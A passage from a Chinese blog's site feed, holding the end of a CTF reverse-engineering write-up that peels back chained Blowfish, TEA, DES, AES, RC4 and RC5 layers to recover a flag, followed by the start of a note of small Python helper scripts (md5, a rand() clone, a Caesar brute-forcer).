j;</span><br><span class="line">    dword_7FF6D8942DE0[j] ^= *((_DWORD *)Dst + j % v8);</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">18</span>; j += <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF6D893145B((__int64)&amp;v10, (__int64)&amp;v11);</span><br><span class="line">    dword_7FF6D8942DE0[j] = v10;</span><br><span class="line">    dword_7FF6D8942DE0[j + <span class="number">1</span>] = v11;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">256</span>; k += <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_7FF6D893145B((__int64)&amp;v10, (__int64)&amp;v11);</span><br><span class="line">      dword_7FF6D8942E50[<span class="number">256</span> * (signed __int64)j + k] = v10;</span><br><span class="line">      dword_7FF6D8942E50[<span class="number">256</span> * (signed __int64)j + k + <span class="number">1</span>] = v11;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  free(Dst);</span><br><span class="line">  <span class="keyword">return</span> sub_7FF6D8931447((__int64)&amp;v5, (__int64)&amp;unk_7FF6D893F780);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>特征:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:00007FF6D8942DE0 dword_7FF6D8942DE0 dd 243F6A88h, 85A308D3h, 13198A2Eh, 3707344h, 0A4093822h</span><br><span class="line">.data:00007FF6D8942DE0                                         ; DATA XREF: sub_7FF6D8931A70+5B↑o</span><br><span class="line">.data:00007FF6D8942DE0                                         ; sub_7FF6D8931A70+A6↑o ...</span><br><span class="line">.data:00007FF6D8942DE0                 dd 299F31D0h, 82EFA98h, 0EC4E6C89h, 452821E6h, 38D01377h</span><br><span class="line">.data:00007FF6D8942DE0                 dd 0BE5466CFh, 34E90C6Ch, 0C0AC29B7h, 0C97C50DDh, 3F84D5B5h</span><br><span class="line">.data:00007FF6D8942DE0                 dd 0B5470917h, 9216D5D9h, 8979FB1Bh</span><br></pre></td></tr></table></figure><h3 id="TEA解密"><a href="#TEA解密" class="headerlink" title="TEA解密"></a>TEA解密</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">uint32_t</span> *v, <span class="keyword">uint32_t</span> *k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0xC6EF3720</span>, i;  <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;                          <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123; <span class="comment">/* basic cycle start */</span></span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125; <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">uint32_t</span> *v, <span class="keyword">uint32_t</span> *k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, i;           <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;                         <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>]; <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123; <span class="comment">/* basic cycle start */</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">    &#125; <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> cipher[<span class="number">80</span>] = &#123;<span class="number">18</span>, <span class="number">186</span>, <span class="number">235</span>, <span class="number">205</span>, <span class="number">57</span>, <span class="number">16</span>, <span class="number">228</span>, <span class="number">62</span>, <span class="number">74</span>, <span class="number">108</span>, <span class="number">147</span>, <span class="number">138</span>, <span class="number">39</span>, <span class="number">186</span>, <span class="number">150</span>, <span class="number">201</span>, <span class="number">206</span>, <span class="number">20</span>, <span class="number">106</span>, <span class="number">221</span>, <span class="number">216</span>, <span class="number">160</span>, <span class="number">180</span>, <span class="number">220</span>, <span class="number">41</span>, <span class="number">108</span>, <span class="number">186</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">153</span>, <span class="number">213</span>, <span class="number">90</span>, <span class="number">223</span>, <span class="number">207</span>, <span class="number">252</span>, <span class="number">29</span>, <span class="number">148</span>, <span class="number">7</span>, <span class="number">95</span>, <span class="number">39</span>, <span class="number">91</span>, <span class="number">45</span>, <span class="number">186</span>, <span class="number">81</span>, <span class="number">191</span>, <span class="number">92</span>, <span class="number">213</span>, <span class="number">122</span>, <span class="number">220</span>, <span class="number">94</span>, <span class="number">89</span>, <span class="number">90</span>, <span class="number">115</span>, <span class="number">152</span>, <span class="number">46</span>, <span class="number">27</span>, <span class="number">231</span>, <span class="number">217</span>, <span class="number">246</span>, <span class="number">48</span>, <span class="number">166</span>, <span class="number">166</span>, <span class="number">248</span>, <span class="number">229</span>, <span class="number">85</span>, <span class="number">214</span>, <span class="number">98</span>, <span class="number">93</span>, <span class="number">157</span>, <span class="number">113</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">237</span>, <span class="number">206</span>, <span class="number">174</span>, <span class="number">168</span>, <span class="number">121</span>, <span class="number">77</span>, <span class="number">166</span>, <span class="number">173</span>&#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> key[] = <span class="string">&quot;A_boring_crypto_&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> b = <span class="number">72</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;= <span class="number">80</span>; i += <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        decrypt((<span class="keyword">uint32_t</span>*)&amp;cipher[i], (<span class="keyword">uint32_t</span>*)key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">80</span>; i += <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\\x%02x&quot;</span>, cipher[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="最终解密脚本"><a href="#最终解密脚本" class="headerlink" title="最终解密脚本"></a>最终解密脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> Blowfish</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, ARC4</span><br><span class="line"></span><br><span class="line">cmp_str = [  <span class="number">0x37</span>, <span class="number">0x2A</span>, <span class="number">0x2F</span>, <span class="number">0x28</span>, <span class="number">0x5A</span>, <span class="number">0xEF</span>, <span class="number">0x17</span>, <span class="number">0x3F</span>, <span class="number">0xE7</span>, <span class="number">0xD5</span>,  <span class="number">0x7C</span>, <span class="number">0xE5</span>, <span class="number">0xA5</span>, <span class="number">0xF7</span>, <span class="number">0xA9</span>, <span class="number">0xDA</span>, <span class="number">0xFF</span>, <span class="number">0xBC</span>, <span class="number">0x3B</span>, <span class="number">0xA9</span>,  <span class="number">0x68</span>, <span class="number">0xDF</span>, <span class="number">0xDF</span>, <span class="number">0xF8</span>, <span class="number">0x7C</span>, <span class="number">0x20</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x8F</span>, <span class="number">0xCC</span>,  <span class="number">0xC4</span>, <span class="number">0xD4</span>, <span class="number">0xF2</span>, <span class="number">0xAC</span>, <span class="number">0x52</span>, <span class="number">0x4B</span>, <span class="number">0xD4</span>, <span class="number">0xC6</span>, <span class="number">0x87</span>, <span class="number">0xE8</span>,  <span class="number">0x40</span>, <span class="number">0xD6</span>, <span class="number">0x9C</span>, <span class="number">0x3C</span>, <span class="number">0xCE</span>, <span class="number">0x05</span>, <span class="number">0x09</span>, <span class="number">0x7C</span>, <span class="number">0xD4</span>, <span class="number">0xB1</span>,  <span class="number">0x6A</span>, <span class="number">0xA9</span>, <span class="number">0x65</span>, <span class="number">0xA3</span>, <span class="number">0xC7</span>, <span class="number">0xE7</span>, <span class="number">0x23</span>, <span class="number">0xD0</span>, <span class="number">0x50</span>, <span class="number">0xA7</span>,  <span class="number">0x7E</span>, <span class="number">0x40</span>, <span class="number">0x71</span>, <span class="number">0x30</span>, <span class="number">0x7C</span>, <span class="number">0x59</span>, <span class="number">0x21</span>, <span class="number">0xCE</span>, <span class="number">0x9F</span>, <span class="number">0xE3</span>,  <span class="number">0x91</span>, <span class="number">0xE0</span>, <span class="number">0x0E</span>, <span class="number">0xF1</span>, <span class="number">0x06</span>, <span class="number">0x29</span>, <span class="number">0xC7</span>, <span class="number">0x94</span>, <span class="number">0xCE</span>, <span class="number">0x7C</span>,  <span class="number">0x21</span>, <span class="number">0x20</span>, <span class="number">0xD6</span>, <span class="number">0x99</span>, <span class="number">0xB0</span>, <span class="number">0x6D</span>, <span class="number">0x2B</span>, <span class="number">0x71</span>, <span class="number">0x21</span>, <span class="number">0x20</span>,  <span class="number">0xD6</span>, <span class="number">0x99</span>, <span class="number">0xB0</span>, <span class="number">0x6D</span>, <span class="number">0x2B</span>, <span class="number">0x71</span>]</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;A_boring_crypto_makes_you_angry!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Crypto6() = Blowfish</span></span><br><span class="line">obj = Blowfish.new(key)</span><br><span class="line">cipher = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cmp_str:</span><br><span class="line">    cipher += <span class="built_in">bytes</span>([i])</span><br><span class="line">plain = obj.decrypt(cipher[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">plain = [<span class="number">18</span>, <span class="number">186</span>, <span class="number">235</span>, <span class="number">205</span>, <span class="number">57</span>, <span class="number">16</span>, <span class="number">228</span>, <span class="number">62</span>, <span class="number">74</span>, <span class="number">108</span>, <span class="number">147</span>, <span class="number">138</span>, <span class="number">39</span>, <span class="number">186</span>, <span class="number">150</span>, <span class="number">201</span>, <span class="number">206</span>, <span class="number">20</span>, <span class="number">106</span>, <span class="number">221</span>, <span class="number">216</span>, <span class="number">160</span>, <span class="number">180</span>, <span class="number">220</span>, <span class="number">41</span>, <span class="number">108</span>, <span class="number">186</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">153</span>, <span class="number">213</span>, <span class="number">90</span>, <span class="number">223</span>, <span class="number">207</span>, <span class="number">252</span>, <span class="number">29</span>, <span class="number">148</span>, <span class="number">7</span>, <span class="number">95</span>, <span class="number">39</span>, <span class="number">91</span>, <span class="number">45</span>, <span class="number">186</span>, <span class="number">81</span>, <span class="number">191</span>, <span class="number">92</span>, <span class="number">213</span>, <span class="number">122</span>, <span class="number">220</span>, <span class="number">94</span>, <span class="number">89</span>, <span class="number">90</span>, <span class="number">115</span>, <span class="number">152</span>, <span class="number">46</span>, <span class="number">27</span>, <span class="number">231</span>, <span class="number">217</span>, <span class="number">246</span>, <span class="number">48</span>, <span class="number">166</span>, <span class="number">166</span>, <span class="number">248</span>, <span class="number">229</span>, <span class="number">85</span>, <span class="number">214</span>, <span class="number">98</span>, <span class="number">93</span>, <span class="number">157</span>, <span class="number">113</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">237</span>, <span class="number">206</span>, <span class="number">174</span>, <span class="number">168</span>, <span class="number">121</span>, <span class="number">77</span>, <span class="number">166</span>, <span class="number">173</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#Crypto5() = TEA</span></span><br><span class="line"></span><br><span class="line">plain = <span class="string">b&#x27;\xaa\x77\x9f\x62\x8a\x27\x1c\x36\x81\x7d\xaa\x1c\x62\xaa\x03\x51\x97\x57\xde\xf1\x77\x55\x00\x9d\xbd\xa6\x28\xab\x12\x9b\xfc\xfb\x75\x6e\x0f\x4d\xaa\xa0\x97\xa0\x8c\xf9\x8a\xdb\xa8\x7f\xd0\xe9\x09\x97\x62\xfa\xa1\xf1\xed\xd1\x5b\xb6\x42\x37\xaf\xab\x9f\x29\x86\x19\x78\x3c\xda\x46\xc3\xd1&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#Crypto4() = DES</span></span><br><span class="line">obj = DES.new(key[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line">plain = obj.decrypt(plain)[<span class="number">0</span>:-<span class="number">8</span>]</span><br><span class="line"><span class="comment"># print(plain)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Crypto3() = AES</span></span><br><span class="line">obj = AES.new(key[<span class="number">0</span>:<span class="number">16</span>])</span><br><span class="line">plain = obj.decrypt(plain)[<span class="number">0</span>:-<span class="number">16</span>]</span><br><span class="line"><span class="comment">#print(plain)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Crypto2() = ARC4</span></span><br><span class="line">obj = ARC4.new(key)</span><br><span class="line">plain = obj.decrypt(plain)</span><br><span class="line"><span class="comment">#print(plain)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Crypto1() = RC5</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_ROL4_</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    y &amp;= <span class="number">0xFF</span></span><br><span class="line">    y %= <span class="number">32</span></span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; y) &amp; <span class="number">0xFFFFFFFF</span>) | (x &gt;&gt; (<span class="number">32</span> - y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_ROR4_</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    y &amp;= <span class="number">0xFF</span></span><br><span class="line">    y %= <span class="number">32</span></span><br><span class="line">    <span class="keyword">return</span> (x &gt;&gt; y) | ((x &lt;&lt; (<span class="number">32</span> - y)) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crypto1</span>(<span class="params">flag_0, num</span>):</span></span><br><span class="line"></span><br><span class="line">    keybox_0 = [<span class="number">0xE4</span>, <span class="number">0x6A</span>, <span class="number">0xED</span>, <span class="number">0x19</span>, <span class="number">0xB6</span>, <span class="number">0x5F</span>, <span class="number">0x79</span>, <span class="number">0x82</span>, <span class="number">0x68</span>, <span class="number">0xFA</span>, <span class="number">0x1F</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x7A</span>, <span class="number">0x64</span>, <span class="number">0x18</span>, <span class="number">0x2A</span>, <span class="number">0xE1</span>, <span class="number">0x69</span>, <span class="number">0xFB</span>, <span class="number">0xFE</span>, <span class="number">0xE3</span>, <span class="number">0x0D</span>, <span class="number">0xD2</span>, <span class="number">0xB0</span>, <span class="number">0x0E</span>, <span class="number">0x9C</span>, <span class="number">0x61</span>, <span class="number">0xB5</span>, <span class="number">0xF8</span>, <span class="number">0x7C</span>, <span class="number">0x8E</span>, <span class="number">0xFF</span>, <span class="number">0xEC</span>, <span class="number">0x70</span>, <span class="number">0xC4</span>, <span class="number">0xA1</span>, <span class="number">0x3A</span>, <span class="number">0xF6</span>, <span class="number">0x87</span>, <span class="number">0x10</span>, <span class="number">0x5F</span>, <span class="number">0xD0</span>, <span class="number">0xCC</span>, <span class="number">0xD6</span>, <span class="number">0x02</span>, <span class="number">0x24</span>, <span class="number">0xA1</span>, <span class="number">0x97</span>, <span class="number">0xB8</span>, <span class="number">0xF3</span>, <span class="number">0x9E</span>, <span class="number">0x87</span>, <span class="number">0x1E</span>, <span class="number">0x85</span>, <span class="number">0xF8</span>, <span class="number">0x51</span>, <span class="number">0x66</span>, <span class="number">0x7E</span>, <span class="number">0xBB</span>, <span class="number">0x17</span>, <span class="number">0xF1</span>, <span class="number">0x3B</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>, <span class="number">0x85</span>, <span class="number">0xBE</span>, <span class="number">0x42</span>, <span class="number">0xEB</span>, <span class="number">0x75</span>, <span class="number">0xA4</span>, <span class="number">0x4F</span>, <span class="number">0x73</span>, <span class="number">0xEF</span>, <span class="number">0x6F</span>, <span class="number">0xED</span>, <span class="number">0x62</span>, <span class="number">0xDC</span>, <span class="number">0xD1</span>, <span class="number">0xA0</span>, <span class="number">0xAA</span>, <span class="number">0x0F</span>, <span class="number">0x7E</span>, <span class="number">0x05</span>, <span class="number">0xD5</span>, <span class="number">0xF7</span>, <span class="number">0xCF</span>, <span class="number">0xFA</span>, <span class="number">0x81</span>, <span class="number">0xAC</span>, <span class="number">0xA0</span>, <span class="number">0x7D</span>, <span class="number">0x7A</span>, <span class="number">0xE8</span>, <span class="number">0xFB</span>, <span class="number">0xF4</span>, <span class="number">0xC7</span>, <span class="number">0x76</span>, <span class="number">0x1C</span>, <span class="number">0xCF</span>, <span class="number">0x66</span>, <span class="number">0x8F</span>]</span><br><span class="line"></span><br><span class="line">    keybox = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(keybox_0) // <span class="number">4</span>):</span><br><span class="line">         keybox[i] = (keybox_0[i * <span class="number">4</span> + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>) + (keybox_0[i * <span class="number">4</span> + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (keybox_0[i * <span class="number">4</span> + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + keybox_0[i * <span class="number">4</span> + <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        size = <span class="built_in">len</span>(flag_0)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span> - size % <span class="number">8</span>):</span><br><span class="line">            flag_0.append(<span class="number">8</span> - size % <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">        size = <span class="built_in">len</span>(flag_0)</span><br><span class="line">        flag = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag_0) // <span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag_0) // <span class="number">4</span>):</span><br><span class="line">            flag[i] = (flag_0[i * <span class="number">4</span> + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>) + (flag_0[i * <span class="number">4</span> + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (flag_0[i * <span class="number">4</span> + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + flag_0[i * <span class="number">4</span> + <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size // <span class="number">8</span>):</span><br><span class="line">            v7 = keybox[<span class="number">0</span>] + flag[<span class="number">2</span> * i]</span><br><span class="line">            v8 = keybox[<span class="number">1</span>] + flag[<span class="number">2</span> * i + <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">13</span>):</span><br><span class="line">                v7 = (keybox[<span class="number">2</span> * k] + _ROL4_(v8 ^ v7, v8)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">                v8 = (keybox[<span class="number">2</span> * k + <span class="number">1</span>] + _ROL4_(v7 ^ v8, v7)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            flag[<span class="number">2</span> * i] = v7</span><br><span class="line">            flag[<span class="number">2</span> * i + <span class="number">1</span>] = v8</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        size = <span class="built_in">len</span>(flag_0)</span><br><span class="line">        flag = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag_0) // <span class="number">4</span>)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag_0) // <span class="number">4</span>):</span><br><span class="line">            flag[i] = (flag_0[i * <span class="number">4</span> + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>) + (flag_0[i * <span class="number">4</span> + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (flag_0[i * <span class="number">4</span> + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + flag_0[i * <span class="number">4</span> + <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size // <span class="number">8</span> - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            v7 = flag[<span class="number">2</span> * i]</span><br><span class="line">            v8 = flag[<span class="number">2</span> * i + <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">                tmp = (v8 - keybox[<span class="number">2</span> * k + <span class="number">1</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">                v8 = _ROR4_(tmp, v7) ^ v7</span><br><span class="line">                tmp = (v7 - keybox[<span class="number">2</span> * k]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">                v7 = _ROR4_(tmp, v8) ^ v8</span><br><span class="line">            flag[<span class="number">2</span> * i] = (v7 - keybox[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            flag[<span class="number">2</span> * i + <span class="number">1</span>] = (v8 - keybox[<span class="number">1</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag_0) // <span class="number">4</span>):</span><br><span class="line">        flag_0[i * <span class="number">4</span> + <span class="number">3</span>] = (flag[i] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        flag_0[i * <span class="number">4</span> + <span class="number">2</span>] = (flag[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        flag_0[i * <span class="number">4</span> + <span class="number">1</span>] = (flag[i] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        flag_0[i * <span class="number">4</span> + <span class="number">0</span>] = flag[i] &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">return</span>(flag_0)</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> plain:</span><br><span class="line">    flag.append(i)</span><br><span class="line">flag = crypto1(<span class="built_in">map</span>(<span class="built_in">ord</span>, flag), <span class="number">0</span>)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">chr</span>, flag)))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag:Aurora{wh47_d035n7_k1ll_y0u_m4k35_y0u_57r0n63r}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write up </tag>
            
            <tag> RC4 </tag>
            
            <tag> Fourier Transform </tag>
            
            <tag> 混淆 </tag>
            
            <tag> RC5 </tag>
            
            <tag> AES </tag>
            
            <tag> DES </tag>
            
            <tag> TEA </tag>
            
            <tag> BlowFish </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python Script</title>
      <link href="/note-tool-python-script/"/>
      <url>/note-tool-python-script/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="计算文件md5"><a href="#计算文件md5" class="headerlink" title="计算文件md5"></a>计算文件md5</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&quot;file.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">md5_obj = hashlib.md5()</span><br><span class="line">md5_obj.update(fp.read())</span><br><span class="line">hash_code = md5_obj.hexdigest()</span><br><span class="line">md5 = <span class="built_in">str</span>(hash_code).lower()</span><br><span class="line">fp.close()</span><br></pre></td></tr></table></figure><h2 id="计算字符串md5"><a href="#计算字符串md5" class="headerlink" title="计算字符串md5"></a>计算字符串md5</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="keyword">import</span> hashlib</span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br></pre></td></tr></table></figure><h2 id="C语言rand"><a href="#C语言rand" class="headerlink" title="C语言rand()"></a>C语言rand()</h2><ul><li>Windows版</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rand</span>():</span></span><br><span class="line">        <span class="keyword">global</span> seed</span><br><span class="line">        seed = seed * <span class="number">0x343FD</span> + <span class="number">0x269EC3</span></span><br><span class="line">        <span class="keyword">return</span> (seed &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x7FFF</span></span><br></pre></td></tr></table></figure><h2 id="凯撒密码26次"><a href="#凯撒密码26次" class="headerlink" title="凯撒密码26次"></a>凯撒密码26次</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">upperDict = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span 